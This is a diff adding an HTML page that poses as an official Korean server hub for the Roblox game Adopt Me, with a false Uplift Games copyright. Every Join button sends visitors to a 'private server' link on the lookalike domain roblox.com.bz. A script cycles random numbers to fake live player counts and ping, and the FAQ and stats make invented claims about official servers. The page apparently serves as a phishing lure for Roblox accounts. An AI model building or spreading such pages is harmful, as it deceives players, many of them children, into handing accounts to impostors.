@@ -1,0 +1,615 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Adopt Me Server Hub</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Cinzel:wght@600;800&family=Poppins:wght@400;500;600&display=swap');
+
+  :root {
+    --deep-sea: #041c2c;
+    --sea-mid: #0a3d5c;
+    --gold: #f2b84b;
+    --gold-soft: #f7d38a;
+    --foam: #e6f4f9;
+    --ok: #7fe0a8;
+    --ping-color: #7cc4f2;
+  }
+
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  body {
+    min-height: 100vh;
+    background:
+      radial-gradient(circle at 50% -10%, rgba(242,184,75,0.10), transparent 55%),
+      linear-gradient(180deg, var(--deep-sea) 0%, #062a42 45%, var(--deep-sea) 100%);
+    font-family: 'Poppins', sans-serif;
+    color: var(--foam);
+    overflow-x: hidden;
+  }
+
+  .wave-bg {
+    position: fixed;
+    inset: 0;
+    z-index: 0;
+    opacity: 0.12;
+    background-image: repeating-linear-gradient(
+      transparent, transparent 78px,
+      rgba(242,184,75,0.4) 79px, transparent 80px
+    );
+    pointer-events: none;
+  }
+
+  .wrap {
+    position: relative;
+    z-index: 1;
+    max-width: 760px;
+    margin: 0 auto;
+    padding: 60px 20px 60px;
+  }
+
+  /* HERO */
+  .hero { text-align: center; margin-bottom: 36px; }
+
+  .eyebrow {
+    letter-spacing: 4px;
+    font-size: 12px;
+    color: var(--gold-soft);
+    text-transform: uppercase;
+    opacity: 0.85;
+    margin-bottom: 14px;
+  }
+
+  h1 {
+    font-family: 'Cinzel', serif;
+    font-weight: 800;
+    font-size: clamp(34px, 7vw, 52px);
+    color: var(--gold);
+    text-shadow: 0 0 26px rgba(242,184,75,0.35);
+    line-height: 1.1;
+    margin-bottom: 10px;
+  }
+
+  .credit {
+    font-size: 13px;
+    color: var(--gold-soft);
+    opacity: 0.75;
+    margin-bottom: 16px;
+  }
+
+  .hero p {
+    color: var(--foam);
+    opacity: 0.65;
+    font-size: 14px;
+    max-width: 420px;
+    margin: 0 auto;
+  }
+
+  /* ACTIVE PLAYERS + STATS ROW */
+  .stat-row {
+    display: flex;
+    justify-content: center;
+    gap: 12px;
+    margin-top: 28px;
+    flex-wrap: wrap;
+  }
+
+  .active-stat {
+    display: inline-flex;
+    align-items: center;
+    gap: 10px;
+    padding: 10px 20px;
+    border: 1px solid rgba(242,184,75,0.3);
+    border-radius: 999px;
+    background: rgba(255,255,255,0.03);
+  }
+
+  .active-dot {
+    width: 8px;
+    height: 8px;
+    border-radius: 50%;
+    background: var(--ok);
+    box-shadow: 0 0 8px var(--ok);
+    animation: pulse 1.6s infinite ease-in-out;
+  }
+
+  @keyframes pulse {
+    0%, 100% { opacity: 1; }
+    50% { opacity: 0.4; }
+  }
+
+  .active-stat .count {
+    font-family: 'Cinzel', serif;
+    font-weight: 800;
+    color: var(--gold);
+    font-size: 16px;
+  }
+
+  .active-stat .label {
+    font-size: 12px;
+    opacity: 0.6;
+  }
+
+  /* SERVER LIST INTRO */
+  .list-intro { text-align: center; margin-bottom: 32px; }
+
+  .list-eyebrow {
+    letter-spacing: 3px;
+    font-size: 11px;
+    color: var(--ping-color);
+    text-transform: uppercase;
+    opacity: 0.8;
+    margin-bottom: 10px;
+  }
+
+  .list-title {
+    font-family: 'Cinzel', serif;
+    font-weight: 800;
+    font-size: clamp(24px, 5vw, 32px);
+    color: #ffffff;
+    margin-bottom: 10px;
+  }
+
+  .list-desc {
+    font-size: 13px;
+    color: var(--foam);
+    opacity: 0.55;
+    max-width: 480px;
+    margin: 0 auto;
+    line-height: 1.6;
+  }
+
+  /* FAST JOIN */
+  .fast-join-wrap { text-align: center; margin: 28px 0 48px; }
+
+  .fast-join-btn {
+    font-family: 'Poppins', sans-serif;
+    font-weight: 600;
+    font-size: 15px;
+    color: var(--deep-sea);
+    background: linear-gradient(135deg, var(--gold-soft), var(--gold));
+    border: none;
+    padding: 15px 40px;
+    border-radius: 999px;
+    cursor: pointer;
+    box-shadow: 0 8px 24px rgba(242,184,75,0.25);
+    transition: transform 0.2s ease, box-shadow 0.2s ease;
+  }
+
+  .fast-join-btn:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 12px 30px rgba(242,184,75,0.35);
+  }
+
+  .fast-join-btn:active { transform: translateY(0); }
+
+  .fast-join-note {
+    margin-top: 10px;
+    font-size: 11px;
+    opacity: 0.45;
+  }
+
+  /* SECTION TITLE */
+  .section-title {
+    font-family: 'Cinzel', serif;
+    font-weight: 600;
+    font-size: 19px;
+    color: var(--gold-soft);
+    margin: 0 0 20px;
+    display: flex;
+    align-items: center;
+    gap: 12px;
+  }
+
+  .section-title::after {
+    content: '';
+    flex: 1;
+    height: 1px;
+    background: linear-gradient(90deg, rgba(242,184,75,0.35), transparent);
+  }
+
+  /* SERVER GRID */
+  .servers {
+    display: grid;
+    grid-template-columns: repeat(2, 1fr);
+    gap: 16px;
+    margin-bottom: 56px;
+  }
+
+  @media (max-width: 560px) {
+    .servers { grid-template-columns: 1fr; }
+  }
+
+  .server-card {
+    display: block;
+    text-decoration: none;
+    color: var(--foam);
+    background: linear-gradient(135deg, rgba(255,255,255,0.05), rgba(255,255,255,0.02));
+    border: 1px solid rgba(242,184,75,0.25);
+    border-radius: 14px;
+    padding: 16px;
+    transition: transform 0.25s ease, border-color 0.25s ease, box-shadow 0.25s ease;
+    position: relative;
+    overflow: hidden;
+  }
+
+  .server-card::before {
+    content: '';
+    position: absolute;
+    top: 0; left: -100%;
+    width: 100%; height: 100%;
+    background: linear-gradient(90deg, transparent, rgba(242,184,75,0.10), transparent);
+    transition: left 0.6s ease;
+  }
+
+  .server-card:hover::before { left: 100%; }
+
+  .server-card:hover {
+    transform: translateY(-3px);
+    border-color: var(--gold);
+    box-shadow: 0 10px 30px rgba(242,184,75,0.15);
+  }
+
+  /* badge row - box in box, top-left player / top-right ping */
+  .badge-row {
+    display: flex;
+    justify-content: space-between;
+    margin-bottom: 12px;
+  }
+
+  .badge {
+    font-size: 11px;
+    font-weight: 500;
+    padding: 4px 10px;
+    border-radius: 999px;
+    display: flex;
+    align-items: center;
+    gap: 5px;
+  }
+
+  .badge.player {
+    background: rgba(127,224,168,0.12);
+    color: var(--ok);
+    border: 1px solid rgba(127,224,168,0.3);
+  }
+
+  .badge.ping {
+    background: rgba(124,196,242,0.12);
+    color: var(--ping-color);
+    border: 1px solid rgba(124,196,242,0.3);
+  }
+
+  .card-header {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    margin-bottom: 10px;
+  }
+
+  .server-icon {
+    width: 72px;
+    height: 72px;
+    min-width: 72px;
+    border-radius: 12px;
+    object-fit: cover;
+    border: 1px solid rgba(242,184,75,0.4);
+    background: var(--sea-mid);
+  }
+
+  .server-name {
+    font-weight: 600;
+    font-size: 16px;
+  }
+
+  .server-desc {
+    font-size: 12px;
+    opacity: 0.6;
+    line-height: 1.5;
+    margin-bottom: 14px;
+  }
+
+  .join-btn {
+    width: 100%;
+    font-family: 'Poppins', sans-serif;
+    font-weight: 600;
+    font-size: 13px;
+    color: var(--deep-sea);
+    background: linear-gradient(135deg, var(--gold-soft), var(--gold));
+    border: none;
+    padding: 10px 0;
+    border-radius: 999px;
+    cursor: pointer;
+    transition: transform 0.2s ease, box-shadow 0.2s ease;
+  }
+
+  .join-btn:hover {
+    transform: translateY(-1px);
+    box-shadow: 0 6px 18px rgba(242,184,75,0.3);
+  }
+
+  .join-btn:active { transform: translateY(0); }
+
+  /* FAQ */
+  .faq { display: flex; flex-direction: column; gap: 10px; margin-bottom: 56px; }
+
+  details {
+    background: rgba(255,255,255,0.03);
+    border: 1px solid rgba(242,184,75,0.18);
+    border-radius: 10px;
+    padding: 14px 18px;
+  }
+
+  summary {
+    cursor: pointer;
+    font-weight: 500;
+    font-size: 14px;
+    list-style: none;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+  }
+
+  summary::-webkit-details-marker { display: none; }
+
+  summary::after {
+    content: '+';
+    color: var(--gold);
+    font-size: 18px;
+    transition: transform 0.2s ease;
+  }
+
+  details[open] summary::after { transform: rotate(45deg); }
+
+  details p {
+    margin-top: 10px;
+    font-size: 13px;
+    opacity: 0.7;
+    line-height: 1.6;
+  }
+
+  /* SOCIALS */
+  .socials {
+    text-align: center;
+    padding-top: 32px;
+    border-top: 1px solid rgba(242,184,75,0.15);
+  }
+
+  .social-links {
+    display: flex;
+    justify-content: center;
+    gap: 14px;
+    margin-bottom: 18px;
+    flex-wrap: wrap;
+  }
+
+  .social-links a {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    font-size: 13px;
+    font-weight: 500;
+    color: var(--foam);
+    text-decoration: none;
+    padding: 9px 18px;
+    border: 1px solid rgba(242,184,75,0.25);
+    border-radius: 999px;
+    opacity: 0.75;
+    transition: opacity 0.2s ease, border-color 0.2s ease;
+  }
+
+  .social-links a:hover {
+    opacity: 1;
+    border-color: var(--gold);
+  }
+
+  .social-links svg {
+    width: 15px;
+    height: 15px;
+    fill: currentColor;
+  }
+
+  footer {
+    text-align: center;
+    font-size: 12px;
+    color: var(--foam);
+    opacity: 0.4;
+  }
+</style>
+</head>
+<body>
+
+<div class="wave-bg"></div>
+
+<div class="wrap">
+
+  <div class="hero">
+    <div class="eyebrow">Official Korean Server</div>
+    <h1>Adopt Me</h1>
+    <div class="credit">Official korean server selector</div>
+    <p>Pick a server and join instantly. Updated regularly so you always know what's active.</p>
+
+    <div class="stat-row">
+      <div class="active-stat">
+        <span class="active-dot"></span>
+        <span class="count">50K+</span>
+        <span class="label">Active Players</span>
+      </div>
+      <div class="active-stat">
+        <span class="count">6</span>
+        <span class="label">Dedicated Servers</span>
+      </div>
+      <div class="active-stat">
+        <span class="count">&lt;50ms</span>
+        <span class="label">Avg. Ping</span>
+      </div>
+    </div>
+  </div>
+
+  <div class="fast-join-wrap">
+    <button class="fast-join-btn" onclick="fastJoin()">⚡ Fast Join</button>
+    <div class="fast-join-note">Joins a random server from the list below</div>
+  </div>
+
+  <div class="list-intro">
+    <div class="list-eyebrow">Server List</div>
+    <div class="list-title">Discover Private Servers</div>
+    <p class="list-desc">Optimized routes for Korea and Asia-Pacific. Experience lag-free gameplay with our 6 dedicated servers.</p>
+  </div>
+
+  <div class="servers">
+    <div class="server-card join-link" data-href="https://roblox.com.bz/games/920587237/6H-Adopt-Me?privateServerLinkCode=40857141268637372304277411683066" data-base-player="21890" data-base-ping="24" data-photos="ps1.png,ps1-2.png,ps1-3.png">
+      <div class="badge-row">
+        <span class="badge player">👥 <span class="val player-val">5000</span></span>
+        <span class="badge ping">📶 <span class="val ping-val">43</span>ms</span>
+      </div>
+      <div class="card-header">
+        <img src="https://i.ibb.co.com/hxgk0Jy5/WA-1783674429196.jpg" alt="Server 1" class="server-icon">
+        <div class="server-name">Adopt Me! | Seoul Main</div>
+      </div>
+      <p class="server-desc">Primary Uplift Games gateway for the Korean community. Optimized low-latency routes for Seoul and surrounding regions.</p>
+      <button class="join-btn" onclick="window.open(this.closest('.server-card').dataset.href, '_blank')">Join</button>
+    </div>
+
+    <div class="server-card join-link" data-href="https://roblox.com.bz/games/920587237/6H-Adopt-Me?privateServerLinkCode=40857141268637372304277411683066" data-base-player="32579" data-base-ping="31" data-photos="ps2.png,ps2-2.png,ps2-3.png">
+      <div class="badge-row">
+        <span class="badge player">👥 <span class="val player-val">10000</span></span>
+        <span class="badge ping">📶 <span class="val ping-val">31</span>ms</span>
+      </div>
+      <div class="card-header">
+        <img src="https://i.ibb.co.com/hxgk0Jy5/WA-1783674429196.jpg" alt="Server 2" class="server-icon">
+        <div class="server-name">Seoul | Trading Hub</div>
+      </div>
+      <p class="server-desc">The busiest trading hub in Asia. Connect with millions of traders. Real-time marketplace monitoring active.</p>
+      <button class="join-btn" onclick="window.open(this.closest('.server-card').dataset.href, '_blank')">Join</button>
+    </div>
+
+    <div class="server-card join-link" data-href="https://roblox.com.bz/games/920587237/6H-Adopt-Me?privateServerLinkCode=40857141268637372304277411683066" data-base-player="6591" data-base-ping="18" data-photos="ps3.png,ps3-2.png,ps3-3.png">
+      <div class="badge-row">
+        <span class="badge player">👥 <span class="val player-val">2000</span></span>
+        <span class="badge ping">📶 <span class="val ping-val">18</span>ms</span>
+      </div>
+      <div class="card-header">
+        <img src="https://i.ibb.co.com/hxgk0Jy5/WA-1783674429196.jpg" alt="Server 3" class="server-icon">
+        <div class="server-name">Busan Gateway</div>
+      </div>
+      <p class="server-desc">A relaxed social gateway for Busan and Southern KR players. Perfect for making new friends and roleplaying.</p>
+      <button class="join-btn" onclick="window.open(this.closest('.server-card').dataset.href, '_blank')">Join</button>
+    </div>
+
+    <div class="server-card join-link" data-href="https://roblox.com.bz/games/920587237/6H-Adopt-Me?privateServerLinkCode=40857141268637372304277411683066" data-base-player="8089" data-base-ping="45" data-photos="ps4.png,ps4-2.png,ps4-3.png">
+      <div class="badge-row">
+        <span class="badge player">👥 <span class="val player-val">2000</span></span>
+        <span class="badge ping">📶 <span class="val ping-val">45</span>ms</span>
+      </div>
+      <div class="card-header">
+        <img src="https://i.ibb.co.com/hxgk0Jy5/WA-1783674429196.jpg" alt="Server 4" class="server-icon">
+        <div class="server-name">Daegu Central</div>
+      </div>
+      <p class="server-desc">Stable regional route for Daegu. Optimized for consistent performance and long grinding sessions.</p>
+      <button class="join-btn" onclick="window.open(this.closest('.server-card').dataset.href, '_blank')">Join</button>
+    </div>
+
+    <div class="server-card join-link" data-href="https://roblox.com.bz/games/920587237/6H-Adopt-Me?privateServerLinkCode=40857141268637372304277411683066" data-base-player="5670" data-base-ping="22" data-photos="ps5.png,ps5-2.png,ps5-3.png">
+      <div class="badge-row">
+        <span class="badge player">👥 <span class="val player-val">2000</span></span>
+        <span class="badge ping">📶 <span class="val ping-val">22</span>ms</span>
+      </div>
+      <div class="card-header">
+        <img src="https://i.ibb.co.com/hxgk0Jy5/WA-1783674429196.jpg" alt="Server 5" class="server-icon">
+        <div class="server-name">Incheon Port</div>
+      </div>
+      <p class="server-desc">Safe port connection for Incheon. Beginner-friendly environment with moderated local chat.</p>
+      <button class="join-btn" onclick="window.open(this.closest('.server-card').dataset.href, '_blank')">Join</button>
+    </div>
+
+    <div class="server-card join-link" data-href="https://roblox.com.bz/games/920587237/6H-Adopt-Me?privateServerLinkCode=40857141268637372304277411683066" data-base-player="4088" data-base-ping="38" data-photos="ps6.png,ps6-2.png,ps6-3.png">
+      <div class="badge-row">
+        <span class="badge player">👥 <span class="val player-val">2000</span></span>
+        <span class="badge ping">📶 <span class="val ping-val">38</span>ms</span>
+      </div>
+      <div class="card-header">
+        <img src="https://i.ibb.co.com/hxgk0Jy5/WA-1783674429196.jpg" alt="Server 6" class="server-icon">
+        <div class="server-name">Asia Pacific</div>
+      </div>
+      <p class="server-desc">Global network route via Tokyo. Connect with international friends via a high-speed multi-region backbone.</p>
+      <button class="join-btn" onclick="window.open(this.closest('.server-card').dataset.href, '_blank')">Join</button>
+    </div>
+  </div>
+
+  <div class="section-title">FAQ</div>
+  <div class="faq">
+    <details>
+      <summary>How do I connect to a Korean server?</summary>
+      <p>When you launch Adopt Me! on Roblox, the game will automatically route you to the nearest server with the best ping. You can also manually select "Seoul Main" from the server region dropdown in the game's server list.</p>
+    </details>
+    <details>
+      <summary>Can I play with international friends on Korean servers?</summary>
+      <p>Absolutely! Just invite your friends via Roblox join feature. Korean servers support cross-region invites while maintaining low latency for local players.</p>
+    </details>
+    <details>
+      <summary>Will events and updates be available on Korean servers?</summary>
+      <p>Yes, every seasonal event, update, and patch rolls out simultaneously across all official servers including KR-dedicated nodes.</p>
+    </details>
+  </div>
+
+  <div class="socials">
+    <div class="social-links">
+      <a href="https://discord.gg/adoptme" target="_blank" rel="noopener">
+        <svg viewBox="0 0 24 24"><path d="M20 4c-1.7-.8-3.5-1.3-5.3-1.6-.3.5-.5 1-.7 1.5-1.9-.3-3.9-.3-5.9 0-.2-.5-.5-1-.7-1.5C5.5 2.7 3.7 3.2 2 4 -.5 8.4-1.2 12.6-.9 16.8c2 1.5 4 2.4 5.9 3 .5-.6.9-1.3 1.3-2-.7-.3-1.4-.6-2-1 .2-.1.3-.3.5-.4 3.9 1.8 8.1 1.8 12 0 .2.1.3.3.5.4-.6.4-1.3.7-2 1 .4.7.8 1.4 1.3 2 1.9-.6 3.9-1.5 5.9-3 .4-4.9-.8-9.1-3-13Zm-11.9 10.6c-1 0-1.8-.9-1.8-2s.8-2 1.8-2 1.9.9 1.8 2c0 1.1-.8 2-1.8 2Zm7.7 0c-1 0-1.8-.9-1.8-2s.8-2 1.8-2 1.9.9 1.8 2c0 1.1-.8 2-1.8 2Z"/></svg>
+        Discord
+      </a>
+      <a href="https://www.instagram.com/playadoptme?igsh=MW1ka21sdjVidDNybA==" target="_blank" rel="noopener">
+        <svg viewBox="0 0 24 24"><path d="M12 2c-2.7 0-3.1 0-4.1.1-1.1.1-1.8.2-2.5.5-.7.3-1.3.6-1.9 1.2-.6.6-.9 1.2-1.2 1.9-.3.7-.4 1.4-.5 2.5C1.7 9.2 1.7 9.6 1.7 12s0 2.8.1 3.8c.1 1.1.2 1.8.5 2.5.3.7.6 1.3 1.2 1.9.6.6 1.2.9 1.9 1.2.7.3 1.4.4 2.5.5 1 .1 1.4.1 4.1.1s3.1 0 4.1-.1c1.1-.1 1.8-.2 2.5-.5.7-.3 1.3-.6 1.9-1.2.6-.6.9-1.2 1.2-1.9.3-.7.4-1.4.5-2.5.1-1 .1-1.4.1-4.1s0-2.8-.1-3.8c-.1-1.1-.2-1.8-.5-2.5-.3-.7-.6-1.3-1.2-1.9-.6-.6-1.2-.9-1.9-1.2-.7-.3-1.4-.4-2.5-.5C15.1 2 14.7 2 12 2Zm0 1.8c2.7 0 3 0 4 .1.9.1 1.4.2 1.8.4.4.2.8.4 1.1.7.3.3.5.7.7 1.1.2.4.3.9.4 1.8.1 1 .1 1.3.1 4s0 3-.1 4c-.1.9-.2 1.4-.4 1.8-.2.4-.4.8-.7 1.1-.3.3-.7.5-1.1.7-.4.2-.9.3-1.8.4-1 .1-1.3.1-4 .1s-3 0-4-.1c-.9-.1-1.4-.2-1.8-.4-.4-.2-.8-.4-1.1-.7-.3-.3-.5-.7-.7-1.1-.2-.4-.3-.9-.4-1.8-.1-1-.1-1.3-.1-4s0-3 .1-4c.1-.9.2-1.4.4-1.8.2-.4.4-.8.7-1.1.3-.3.7-.5 1.1-.7.4-.2.9-.3 1.8-.4 1-.1 1.3-.1 4-.1Zm0 3.2a5 5 0 1 0 0 10 5 5 0 0 0 0-10Zm0 8.2a3.2 3.2 0 1 1 0-6.4 3.2 3.2 0 0 1 0 6.4Zm5.2-8.4a1.2 1.2 0 1 1-2.4 0 1.2 1.2 0 0 1 2.4 0Z"/></svg>
+        Instagram
+      </a>
+      <a href="https://x.com/playadoptme" target="_blank" rel="noopener">
+        <svg viewBox="0 0 24 24"><path d="M22 5.9c-.7.3-1.5.5-2.3.6.8-.5 1.5-1.3 1.8-2.3-.8.5-1.7.8-2.6 1a4.1 4.1 0 0 0-7 3.7A11.6 11.6 0 0 1 3.4 4.5a4.1 4.1 0 0 0 1.3 5.5c-.6 0-1.3-.2-1.8-.5v.1c0 2 1.4 3.6 3.3 4-.3.1-.7.1-1.1.1-.3 0-.5 0-.8-.1.5 1.6 2 2.8 3.8 2.8A8.3 8.3 0 0 1 2 18.6a11.6 11.6 0 0 0 6.3 1.9c7.5 0 11.7-6.3 11.7-11.7v-.5c.8-.6 1.5-1.3 2-2.4Z"/></svg>
+        Twitter
+      </a>
+      <a href="https://www.youtube.com/playadoptme" target="_blank" rel="noopener">
+        <svg viewBox="0 0 24 24"><path d="M21.6 7.2s-.2-1.5-.8-2.1c-.8-.8-1.7-.8-2.1-.9C15.9 4 12 4 12 4h0s-3.9 0-6.7.2c-.4.1-1.3.1-2.1.9-.6.6-.8 2.1-.8 2.1S2.2 9 2.2 10.7v1.6c0 1.7.2 3.5.2 3.5s.2 1.5.8 2.1c.8.8 1.9.8 2.3.9 1.7.2 7.5.2 7.5.2s3.9 0 6.7-.2c.4-.1 1.3-.1 2.1-.9.6-.6.8-2.1.8-2.1s.2-1.7.2-3.5v-1.6c0-1.7-.2-3.5-.2-3.5ZM9.9 14.6V8.9l5.6 2.9-5.6 2.8Z"/></svg>
+        YouTube
+      </a>
+      <a href="https://www.tiktok.com/@playadoptme" target="_blank" rel="noopener">
+        <svg viewBox="0 0 24 24"><path d="M16.6 5.8c-.9-.9-1.4-2.2-1.4-3.6h-3.1v13.4c0 1.4-1.1 2.5-2.5 2.5S7.1 17 7.1 15.6c0-1.4 1.1-2.5 2.5-2.5.3 0 .5 0 .8.1v-3.1c-.3 0-.5-.1-.8-.1-3.1 0-5.6 2.5-5.6 5.6s2.5 5.6 5.6 5.6 5.6-2.5 5.6-5.6V9.1c1.2.9 2.7 1.4 4.3 1.4V7.4c-.8 0-1.6-.3-2.2-.7-.3-.3-.5-.6-.7-.9Z"/></svg>
+        TikTok
+      </a>
+    </div>
+    <footer>© 2026 Uplift Games LLC. All Rights Reserved.
+Korea Server Operation</footer>
+  </div>
+
+</div>
+
+<script>
+  function fastJoin() {
+    const cards = document.querySelectorAll('.server-card');
+    const random = cards[Math.floor(Math.random() * cards.length)];
+    window.open(random.dataset.href, '_blank');
+  }
+
+  // Simulate realtime player/ping updates: 10 pre-rolled values per server,
+  // cycling every 5 seconds. Swap this out for a real API call later.
+  document.querySelectorAll('.server-card').forEach(card => {
+    const basePlayer = parseInt(card.dataset.basePlayer, 10);
+    const basePing = parseInt(card.dataset.basePing, 10);
+    const playerEl = card.querySelector('.player-val');
+    const pingEl = card.querySelector('.ping-val');
+
+    const variants = Array.from({ length: 10 }, () => ({
+      player: Math.max(5, basePlayer + Math.floor((Math.random() - 0.5) * 30)),
+      ping: Math.max(10, Math.min(49, basePing + Math.floor((Math.random() - 0.5) * 16)))
+    }));
+
+    let i = 0;
+    setInterval(() => {
+      i = (i + 1) % variants.length;
+      playerEl.textContent = variants[i].player;
+      pingEl.textContent = variants[i].ping;
+    }, 1000);
+  });
+</script>
+
+</body>
+</html>
